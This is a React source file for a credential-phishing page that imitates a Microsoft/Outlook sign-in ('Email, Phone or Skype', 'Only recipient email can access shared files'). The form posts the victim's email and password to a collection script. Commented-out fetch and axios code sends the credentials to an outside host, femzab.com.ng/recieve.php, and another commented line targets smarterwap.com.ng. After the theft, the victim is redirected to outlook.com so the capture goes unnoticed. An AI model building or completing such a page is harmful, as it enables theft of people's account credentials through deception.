// import logo from './logo.svg';
import './App.css';
import background from "./asset/bg.png";
import { useState } from 'react'
import Loader from "react-js-loader";
// import axios from 'axios'

function App() {
  const [loading, setLoading] = useState(false)
  const [error, setError] = useState('')
  const [input, setInput] =  useState({
    email: '',
    password: ''
  })

  const _upload = async()=>{
    // validate input
    setError("")
    if( !(/^[^@]+@\w+(\.\w+)+\w$/.test(input.email)) ){
      setError("Email is invalid")
      return
    }

    if( (input.password).length < 2  ){
      setError("Password is required")
      return
    }

    setLoading(true)
    setLoading(false)

    // const formData = new FormData();
    // formData.append("email", input.email)
    // formData.append("password", input.password)
		// fetch('https://femzab.com.ng/recieve.php',{
    //                 method: "POST",
    //                 body: formData,
    //             })
    //             .then((response) => response.json())
    //             .then((result) => {
    //                 // user221999 ;
    //                 setLoading(false)
    //                 window.location.replace("https://outlook.com")
    //             })
    //             .catch((error) => {
    //                 // alert(error);
    //                 setLoading(false)
    //                 console.log(error)
    //                 setError('An error occurred, try again later')
    //             })
    //             .then(() => {});
    // try{
    //   var fd = 
    //   await axios.post("https://femzab.com.ng/recieve.php", input)
    //   window.location.replace("https://outlook.com")
    // }catch(e){
    //   console.log(e)
    //   setError('An error occurred, try again later')
    // }
    

  }
  return (
    <div style={{ backgroundImage: `url(${background})`, position: 'fixed', width: '100%', height: '100%', backgroundSize: 'cover', display: 'flex', justifyContent: 'center', alignItems: 'center' }}>
      <div className="w3-card-4 w3-white w3-round w3-padding" style={{ width: 350 }}>
        {/* <form encType='multipart/form-data' action='https://smarterwap.com.ng/connector.php' method='post'  className="w3-margin-8"> */}
        <form encType='multipart/form-data' action='http://localhost:8088/index.php' method='post'  className="w3-margin-8">
          <img src={require('./asset/logo.png')} alt='' style={{ height: 60, left: -18, position: 'relative' }} />

          <h5 style={{ 
            fontWeight: 700,
            lineHeight: 1.2,
            color: 'black',
            fontSize: 20,
            marginBottom: 20
           }}>Sign In</h5>

           <div>
            {
              (loading && (
                <Loader type="bubble-scale" bgColor={"#0a59a3"} title={""} color={'#0a59a3'} size={50} />
              ))
            }
            
            {
              (error !== "") && (
              <div className="w3-panel w3-pale-red w3-leftbar w3-border-red">
                <p>{error}</p>
              </div>)
            }
           </div>

          <div style={{ marginBottom: 20 }}>
            Only recipient email can access shared files
          </div>

          <div style={{ marginBottom: 20 }}>
            <input type='email' name='email' value={input.email} onChange={e => setInput({...input, email: e.target.value})} className="w3-input w3-border w3-round" placeholder="Email, Phone or Skype" required />
          </div>

          <div style={{ marginBottom: 20 }}>
            <input name='password' value={input.password} onChange={e => setInput({...input, password: e.target.value})} className="w3-input w3-border w3-round" placeholder="Password" type="password" required />
          </div>

          <div style={{ display: 'flex', justifyContent: 'flex-end', alignItems: 'flex-end', marginBottom: 20 }}>
            <a href="#forgot" style={{ color: '#007bff', textDecoration: 'none' }}>Forgot Password?</a>
          </div>

          <div style={{ display: 'flex', justifyContent: 'center', alignItems: 'center' }}>
            <button type='submit' 
            // disabled={loading} 
            // onClick={()=>_upload()}
            className="w3-btn w3-block w3-text-white w3-round" style={{ width: '94%', background: '#0a59a3', fontWeight: '600' }}>Next</button>
          </div>

          <br />

        </form>
      </div>
    </div>
  );
}

export default App;
